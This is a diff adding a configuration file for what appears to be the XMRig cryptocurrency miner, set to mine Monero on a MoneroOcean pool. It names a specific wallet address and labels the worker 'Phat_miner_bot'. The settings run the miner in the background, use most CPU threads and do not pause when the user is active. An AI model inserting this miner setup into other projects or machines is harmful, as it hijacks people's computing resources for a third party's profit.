@@ -1,0 +1,185 @@
+{
+    "api": {
+        "id": null,
+        "worker-id": null
+    },
+    "http": {
+        "enabled": false,
+        "host": "127.0.0.1",
+        "port": 0,
+        "access-token": null,
+        "restricted": true
+    },
+    "autosave": false,
+    "background": true,
+    "colors": true,
+    "title": true,
+    "randomx": {
+        "init": -1,
+        "init-avx2": 1,
+        "mode": "fast",
+        "1gb-pages": true,
+        "rdmsr": false,
+        "wrmsr": false,
+        "cache_qos": false,
+        "numa": true,
+        "scratchpad_prefetch_mode": 1
+    },
+    "cpu": {
+        "enabled": true,
+		"max-threads-hint": 100,
+        "huge-pages": true,
+        "huge-pages-jit": true,
+        "hw-aes": null,
+        "priority": 5,
+        "memory-pool": true,
+        "yield": true,
+        "asm": true,
+        "argon2-impl": null,
+        "argon2": [0, 1, 2, 3, 6, 7],
+        "cn": [
+            [1, 0],
+            [1, 1],
+            [1, 2],
+            [1, 3]
+        ],
+        "cn-heavy": [
+            [1, 0],
+            [1, 1]
+        ],
+        "cn-lite": [
+            [1, 0],
+            [1, 1],
+            [1, 2],
+            [1, 3],
+            [1, 6],
+            [1, 7]
+        ],
+        "cn-pico": [
+            [2, 0],
+            [2, 4],
+            [2, 1],
+            [2, 5],
+            [2, 2],
+            [2, 6],
+            [2, 3],
+            [2, 7]
+        ],
+        "cn/2": [
+            [1, 0],
+            [1, 1],
+            [1, 2]
+        ],
+        "cn/gpu": [
+            [1, 0],
+            [1, 4],
+            [1, 1],
+            [1, 5],
+            [1, 2],
+            [1, 6],
+            [1, 3],
+            [1, 7]
+        ],
+        "cn/upx2": [
+            [2, 0],
+            [2, 4],
+            [2, 1],
+            [2, 5],
+            [2, 2],
+            [2, 6],
+            [2, 3],
+            [2, 7]
+        ],
+        "flex": [-1, -1, -1, -1, -1],
+        "ghostrider": [
+            [8, 0],
+            [8, 1],
+            [8, 2],
+            [8, 2]
+        ],
+        "panthera": [0, -1, -1,-1,-1],
+        "rx": [             
+            [2, 1],
+            [2, -1],
+            [2, 2],
+            [2, -1],
+            [2, 4],
+            [2, -1],
+            [2, 4],
+            [2, -1]
+        ],
+        "rx/arq": [-1, -1, -1, -1, -1, -1, -1, 0],
+        "rx/wow": [0, 1, 2, 3, 6, 7],
+        "rx/xeq": [0, 4, 1, 5, 2, 6, 3, 7],
+        "cn-lite/0": false,
+        "cn/0": false,
+        "rx/keva": "rx/wow"
+    },
+    "opencl": {
+        "enabled": false,
+        "cache": true,
+        "loader": null,
+        "platform": "AMD",
+        "adl": true,
+        "cn-lite/0": false,
+        "cn/0": false,
+        "panthera": false
+    },
+    "cuda": {
+        "enabled": false,
+        "loader": null,
+        "nvml": true,
+        "cn-lite/0": false,
+        "cn/0": false,
+        "panthera": false
+    },
+    "donate-level": 0,
+    "donate-over-proxy": 0,
+    "pools": [
+        {
+            "algo": "rx/0",
+            "coin": null,
+            "url": "gulf.moneroocean.stream:10004",
+            "user": "49a66Lfa7zZWP7fCWrT9zY1yFjGLy9DKDULJj6cfey8GLbT9AfRMKf2V9eXeLVxeuU3Ei1QeGZtn1fnrA7wHpysvMoS6uew",
+            "pass": "Phat_miner_bot",
+            "rig-id": null,
+            "nicehash": true,
+            "keepalive": true,
+            "enabled": true,
+            "tls": false,
+            "sni": false,
+            "tls-fingerprint": null,
+            "daemon": false,
+            "socks5": null,
+            "self-select": null,
+            "submit-to-origin": false
+        }
+    ],
+    "retries": 5,
+    "retry-pause": 5,
+    "print-time": 180,
+    "health-print-time": 180,
+    "dmi": true,
+    "syslog": false,
+    "tls": {
+        "enabled": false,
+        "protocols": null,
+        "cert": null,
+        "cert_key": null,
+        "ciphers": null,
+        "ciphersuites": null,
+        "dhparam": null
+    },
+    "dns": {
+        "ipv6": false,
+        "ttl": 30
+    },
+    "user-agent": null,
+    "verbose": 5,
+    "watch": true,
+    "rebench-algo": false,
+    "bench-algo-time": 20,
+    "algo-min-time": 0,
+    "pause-on-battery": true,
+    "pause-on-active": false
+}
